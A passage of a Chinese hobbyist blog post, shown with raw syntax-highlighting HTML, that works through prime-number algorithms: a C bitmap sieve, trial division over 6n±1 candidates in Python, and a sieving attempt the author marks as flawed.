class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;math.h&gt;  无语，linux不支持&lt;math.h&gt;头文件，只能自己写开根号函数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHIFT 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MASK 0x1F</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> *arr)</span></span>;     <span class="comment">//防止看不懂，照搬链接 2 中的函数，不懂先去看链接 2</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clr</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> *arr)</span></span>;    <span class="comment">//防止看不懂，照搬链接 2 中的函数，不懂先去看链接 2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> *arr)</span></span>;    <span class="comment">//防止看不懂，照搬链接 2 中的函数，不懂先去看链接 2</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(<span class="keyword">int</span> *arr)</span></span>;         <span class="comment">//简单调用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myexit</span><span class="params">(<span class="keyword">int</span> *ptr)</span></span>;        <span class="comment">//不做解释</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">mysqrt</span><span class="params">(<span class="keyword">float</span> x)</span></span>;        <span class="comment">//防止看不懂，照搬链接 3 中的函数，不懂先去看链接 3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k, num, space, *arr, sqrt_b;</span><br><span class="line">    <span class="keyword">float</span> sqrt_a;</span><br><span class="line">    FILE *fp=<span class="literal">NULL</span>;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./1.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);  <span class="comment">//打开当前目录下的1.txt文件，没有则自动生成1.txt文件</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入想要查找的质数范围的最大数值(例:16384)：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">    </span><br><span class="line">    sqrt_a = mysqrt(num);</span><br><span class="line">    sqrt_b = (<span class="keyword">int</span>)sqrt_a + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n(int)sqrt(%d)+1 = %d\n&quot;</span>,num,sqrt_b);</span><br><span class="line">    </span><br><span class="line">    space = sqrt_b*sqrt_b / <span class="number">32</span> + <span class="number">1</span>;  <span class="comment">//--/为了防止堆溢出，这里就开大了点/--//</span></span><br><span class="line">    arr = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * space);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//--/初始化bit位为0,表示一个 0-所输入数值 内的所有数值均存在的数组/--//</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= num; i ++)</span><br><span class="line">        clr(i, arr);</span><br><span class="line">    </span><br><span class="line">    start(arr);    <span class="comment">//1-7中1、4、6不为质数，剔除</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=sqrt_b;i++)&#123;    <span class="comment">//操作bitmap，筛选删除数的倍数</span></span><br><span class="line">        <span class="keyword">for</span>(j=i;(j&lt;=num/i || j&lt;=sqrt_b);j++)&#123;</span><br><span class="line">            k = i*j;</span><br><span class="line">            <span class="built_in">set</span>(k,arr);</span><br><span class="line">            <span class="keyword">if</span> (!test(k, arr)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;bitmap操作失败 - %d\n&quot;</span>,k);</span><br><span class="line">                myexit(arr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置num的比特位为1</span></span><br><span class="line">    k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=num;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!test(i, arr)) &#123;</span><br><span class="line">            k++;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp,<span class="string">&quot;%d,&quot;</span>,i);</span><br><span class="line">            <span class="keyword">if</span>(k%<span class="number">20</span>==<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">fprintf</span>(fp,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n  1~%d 中有 %d 个质数\n\n&quot;</span>,num,k);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(arr);  <span class="comment">//--/一开始我没写free(),出事故了,想看事故什么样,注释该行就可以/--//</span></span><br><span class="line">                <span class="comment">//--/重启解决99%的问题/--//</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> *arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index_loc, bit_loc;</span><br><span class="line"></span><br><span class="line">    index_loc = n &gt;&gt; SHIFT; <span class="comment">// 等价于n / 32</span></span><br><span class="line">    bit_loc = n &amp; MASK;    <span class="comment">// 等价于n % 32 。 h%2^n = h &amp; (2^n -1)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//--/先左移1，再或等于数组，优先级/--//</span></span><br><span class="line">    arr[index_loc] |= <span class="number">1</span> &lt;&lt; bit_loc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//--/初始化bitmap，将所有字节置为0/--//</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clr</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> *arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index_loc;</span><br><span class="line">    index_loc = n &gt;&gt; SHIFT;</span><br><span class="line">    arr[index_loc] &amp;= <span class="number">0</span>;    <span class="comment">//bit为0表示该数存在，bit为1代表该数被删除</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//--/测试bitmap中的bit位是否被置为1/--//</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> *arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, flag;</span><br><span class="line">    i = <span class="number">1</span> &lt;&lt; (n &amp; MASK);</span><br><span class="line">    flag = arr[n &gt;&gt; SHIFT] &amp; i;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(<span class="keyword">int</span> *arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">set</span>(<span class="number">0</span>,arr);    <span class="comment">//1-7中0、1、4、6不为质数</span></span><br><span class="line">    <span class="keyword">if</span> (!test(<span class="number">0</span>, arr)) &#123;    <span class="comment">//这些if(!test(,))&#123;&#125;都可直接删除</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bitmap操作失败 - 0\n&quot;</span>);</span><br><span class="line">        myexit(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">set</span>(<span class="number">1</span>,arr);   </span><br><span class="line">    <span class="keyword">if</span> (!test(<span class="number">1</span>, arr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bitmap操作失败 - 1\n&quot;</span>);</span><br><span class="line">        myexit(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">set</span>(<span class="number">4</span>,arr);</span><br><span class="line">    <span class="keyword">if</span> (!test(<span class="number">4</span>, arr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bitmap操作失败 - 4\n&quot;</span>);</span><br><span class="line">        myexit(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">set</span>(<span class="number">6</span>,arr);</span><br><span class="line">    <span class="keyword">if</span> (!test(<span class="number">6</span>, arr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bitmap操作失败 - 6\n&quot;</span>);</span><br><span class="line">        myexit(arr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myexit</span><span class="params">(<span class="keyword">int</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * function:神奇的算法实现sqrt()</span></span><br><span class="line"><span class="comment"> * author:wanglu</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">mysqrt</span><span class="params">(<span class="keyword">float</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> xhalf = <span class="number">0.5f</span>*x;</span><br><span class="line">    <span class="keyword">int</span> i = *(<span class="keyword">int</span>*)&amp;x; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!x) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    i = <span class="number">0x5f375a86</span>- (i&gt;&gt;<span class="number">1</span>); <span class="comment">// beautiful number</span></span><br><span class="line">    x = *(<span class="keyword">float</span>*)&amp;i; </span><br><span class="line">    x = x*(<span class="number">1.5f</span>-xhalf*x*x); <span class="comment">// 牛顿迭代法，提高精度</span></span><br><span class="line">    x = x*(<span class="number">1.5f</span>-xhalf*x*x); <span class="comment">// 牛顿迭代法，提高精度</span></span><br><span class="line">    x = x*(<span class="number">1.5f</span>-xhalf*x*x); <span class="comment">// 牛顿迭代法，提高精度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>/x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以上代码的核心是两条for循环:</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=sqrt_b;i++)&#123;    //操作bitmap，筛选删除数的倍数</span><br><span class="line">        <span class="keyword">for</span>(j=i;(j&lt;=num/i || j&lt;=sqrt_b);j++)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">#两重for循环，最大均为√n+1,相乘约等于O(n)            </span></span><br><span class="line"><span class="comment">#计算量分析 n/2+n/3+...+n/√n </span></span><br><span class="line"><span class="comment">#假设n=16不难看出计算量为16/2+16/3+16/4≈17，假设n=64不难看出计算量约为32+32/3+16+8≈66</span></span><br><span class="line"><span class="comment">#我这数学也不太行，反正计算复杂度应该是O(n)吧，n很大时比O(0.4*n√n)要好一些</span></span><br><span class="line"><span class="comment">#空间复杂度大概是O(n)bit，单位是bit很重要，比单位是int少了32倍空间</span></span><br></pre></td></tr></table></figure><h3 id="5、以质数为判断数"><a href="#5、以质数为判断数" class="headerlink" title="5、以质数为判断数"></a>5、以质数为判断数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 理论：</span></span><br><span class="line">  <span class="comment"># 其实不难发现，要判断一个新的数是否为质数</span></span><br><span class="line">  <span class="comment"># 我们只需要将小于等于他的平方根的所有质数依次与该新数相模即可判断新数是否为质数</span></span><br><span class="line">  <span class="comment"># 之前的代码可知，2^20 = 1048576 中有 82025个质数，</span></span><br><span class="line">  <span class="comment"># 而√1048567 = 1024，1024以内有172个素数</span></span><br><span class="line">  <span class="comment"># 所以我们判断1048577是否为质数最多只要循环172+1次就够了</span></span><br><span class="line">  <span class="comment"># 而我们正常循环的话，需要大概1024次循环，效率能提高近6倍</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实现</span></span><br><span class="line">  <span class="comment"># 有了以上的理论基础，我们可以按以下步骤编写代码</span></span><br><span class="line">  <span class="comment"># 1、因为要要操作数组，而我觉得python操作数组比较方便，所以现在用python进行编码</span></span><br><span class="line">  <span class="comment"># 2、定义两个数组arr[2,3]、brr[2,3]，用户输入想要取得的素数范围的最大值</span></span><br><span class="line">  <span class="comment"># 3、for循环生成arr[2,3,6n-1,6n+1]</span></span><br><span class="line">  <span class="comment"># 4、for循环遍历取出arr[]中的一个值x，求出√x</span></span><br><span class="line">  <span class="comment"># 5、以√x为range值for循环遍历brr[]依次取出小于√x的质数y，去与x相模(x%y)</span></span><br><span class="line">  <span class="comment"># 6、遍历完模值均不等于0，则将x用append()函数加入到brr中</span></span><br><span class="line">  <span class="comment"># 7、arr[]遍历完后将brr[]输出到1.txt文件即可</span></span><br></pre></td></tr></table></figure><p>python代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f_arr</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">global</span> arr</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,num):</span><br><span class="line">        arr.append(<span class="number">6</span>*i-<span class="number">1</span>)</span><br><span class="line">        arr.append(<span class="number">6</span>*i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:    </span><br><span class="line">        flag = arr[-<span class="number">1</span>]    <span class="comment">#取最后一个元素</span></span><br><span class="line">        <span class="keyword">if</span>(flag&gt;user):</span><br><span class="line">            arr.remove(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f_brr</span>(<span class="params">len_arr</span>):</span></span><br><span class="line">    <span class="keyword">global</span> arr</span><br><span class="line">    <span class="keyword">global</span> brr</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,len_arr): </span><br><span class="line">        <span class="comment">#print(&quot;arr[&quot;,i,&quot;] =&quot;,arr[i])    #调试</span></span><br><span class="line">        flag_this = <span class="number">1</span>   </span><br><span class="line">        sqrt = <span class="built_in">int</span>(math.sqrt(arr[i]))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,sqrt):</span><br><span class="line">            <span class="keyword">if</span>(arr[i]%brr[j]==<span class="number">0</span>):flag_this=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span>(flag_this):brr.append(arr[i])</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、定义两个数组arr、brr，用户输入想要取得的素数范围的最大值</span></span><br><span class="line">arr = [<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">brr = [<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">user = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个值，我将输出0-该值之内的所有素数(例1048576):&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、for循环生成arr[2,3,6n-1,6n+1]</span></span><br><span class="line">num = <span class="built_in">int</span>(user/<span class="number">6</span>)+<span class="number">3</span></span><br><span class="line">f_arr(num)</span><br><span class="line"><span class="comment">#print(arr)           #查看arr生成情况</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4、5、6</span></span><br><span class="line">arr_len = <span class="built_in">int</span>(<span class="built_in">len</span>(arr))</span><br><span class="line">f_brr(arr_len)</span><br><span class="line"><span class="comment">#print(brr)           #查看brr生成情况</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7、arr[]遍历完后将brr[]输出到1.txt文件即可</span></span><br><span class="line">brr_len = <span class="built_in">len</span>(brr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0 -&quot;</span>,user,<span class="string">&quot;之间有&quot;</span>,brr_len,<span class="string">&quot;个质数&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./1.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,brr_len):</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">15</span>==<span class="number">0</span>):f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(brr[i])+<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>对比分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 1、遍历的数组从正整数集转变为arr[2,3,6*n-1,6*n+1]，减少了2/3的数字量</span><br><span class="line"># 2、用于模的数组从[0-√x]转变为[0-√x的素数集]，效率能提高近6倍</span><br></pre></td></tr></table></figure><p><img src="image-20230308011256155.png" alt="image-20230308011256155"></p><p>启发：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其实  4、筛选法求质数  也可以用质数集来快速清空bitmap中的非质数</span></span><br><span class="line"><span class="comment"># 不过前提是要在代码运行时实时生成一个现成的质数集给它用</span></span><br><span class="line"><span class="comment"># 实现的话  4、筛选法求质数  的效率按理来说应该还能提高近6倍</span></span><br><span class="line"><span class="comment"># 我的主要目的是的得到质数集，分析质数规律，找到求质数集的公式法</span></span><br><span class="line"><span class="comment"># 所以  4、筛选法求质数  的进一步优化就不做了</span></span><br></pre></td></tr></table></figure><h3 id="6、-2-3-6-n-1-6-n-1-与筛选法的结合"><a href="#6、-2-3-6-n-1-6-n-1-与筛选法的结合" class="headerlink" title="6、[2,3,6*n-1,6*n+1]与筛选法的结合"></a>6、[2,3,6*n-1,6*n+1]与筛选法的结合</h3><p><img src="ae2a57711da6759ab83bfb6e1d3fe2f.jpg" alt="ae2a57711da6759ab83bfb6e1d3fe2f"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 理论</span></span><br><span class="line">  <span class="comment"># 从上图中我们不难发现[2,3,6*n-1,6*n+1]这个集合中的非质数是由质数相乘得来的</span></span><br><span class="line">  <span class="comment"># 所以我们可以遍历[2,3,6*n-1,6*n+1]</span></span><br><span class="line">  <span class="comment"># 将每个质数依次乘以大于等于自身的质数来清空[2,3,6*n-1,6*n+1]中的非质数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实践</span></span><br><span class="line">  <span class="comment"># 因为要操作数组，所以还是用python进行代码编写</span></span><br><span class="line">  <span class="comment"># 1、用户输入数值，生成 arr[] = [2,3,6*n-1,6*n+1]</span></span><br><span class="line">  <span class="comment"># 2、遍历 arr[]，从5开始，依次乘自身与比自身大的 arr[] 中的数</span></span><br><span class="line">  <span class="comment"># 3、arr.remove() 删除得到的 arr[] 中的非质数</span></span><br><span class="line">  <span class="comment"># 4、输出 arr[]</span></span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f_arr</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">global</span> arr</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,num):</span><br><span class="line">        arr.append(<span class="number">6</span>*i-<span class="number">1</span>)</span><br><span class="line">        arr.append(<span class="number">6</span>*i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:    </span><br><span class="line">        flag = arr[-<span class="number">1</span>]    <span class="comment">#取最后一个元素</span></span><br><span class="line">        <span class="keyword">if</span>(flag&gt;user):</span><br><span class="line">            arr.remove(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear_arr</span>(<span class="params">arr</span>):</span></span><br><span class="line">    i = <span class="number">2</span></span><br><span class="line">    j = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">len</span>(arr)/<span class="number">5</span>) &gt;= i+<span class="number">1</span> :    <span class="comment">#除5是因为5是最小乘值</span></span><br><span class="line">        arr_len0 = <span class="built_in">int</span>(<span class="built_in">len</span>(arr)/<span class="number">5</span> + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,arr_len0):</span><br><span class="line">            num = arr[i]*arr[j]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                arr.remove(num)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(num,<span class="string">&quot;is not in arr[]&quot;</span>)    <span class="comment">#调试</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># 1、用户输入数值，生成 arr[] = [2,3,6*n-1,6*n+1]</span></span><br><span class="line">arr = [<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">user = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个值，我将输出0-该值之内的所有素数(例1048576):&quot;</span>))</span><br><span class="line">num = <span class="built_in">int</span>(user/<span class="number">6</span>)+<span class="number">3</span></span><br><span class="line">f_arr(num)</span><br><span class="line"><span class="comment">#print(arr)           #查看arr生成情况</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、遍历 arr[]，从5开始，依次乘自身与比自身大的 arr[] 中的数</span></span><br><span class="line"><span class="comment"># 3、arr.remove() 删除得到的 arr[] 中的非质数</span></span><br><span class="line">brr = clear_arr(arr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4、输出 brr[]</span></span><br><span class="line"><span class="built_in">print</span>(brr)</span><br></pre></td></tr></table></figure><p>分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 没有考虑到[2,3,6*n-1,6*n+1]中的非质数可能由两个以上的质数相乘得来</span></span><br><span class="line"><span class="comment"># 所以以上代码错误，不能用于生成素数集</span></span><br></pre></td></tr></table></figure><p><img src="image-20230308110246997.png" alt="image-20230308110246997"></p><p>启发：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我们是否可以将数分段，然后逐段推导质数？</span></span><br><span class="line"><span class="comment"># 例如 0-5^2为一段、5^2-5^3为一段、5^3-5^4为一段......</span></span><br><span class="line"><span class="comment"># 然后逐段找规律求解质数集</span></span><br><span class="line"><span class="comment"># 甚至是用前一段的质数推算出后一段的所有质数(类似于数学公式)</span></span><br></pre></td></tr></table></figure><p>完善：针对分析中的出错，这里给出以下完善代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 